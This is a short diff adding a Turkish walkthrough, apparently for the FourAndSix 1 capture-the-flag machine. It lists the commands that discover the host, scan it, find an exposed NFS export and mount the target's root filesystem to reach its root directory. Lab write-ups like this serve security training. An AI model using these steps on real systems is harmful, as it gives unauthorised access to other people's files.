@@ -1,0 +1,7 @@
+FOUR AND SIX 1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.97 bulundu.
+2 - nmap -sT -A 192.168.2.97
+3 - showmount -e 192.168.2.97
+4 - mkdir /tmp/fourandsix1
+5 - mount -t nfs 192.168.2.97:/ /tmp/fourandsix1
+6 - cd root
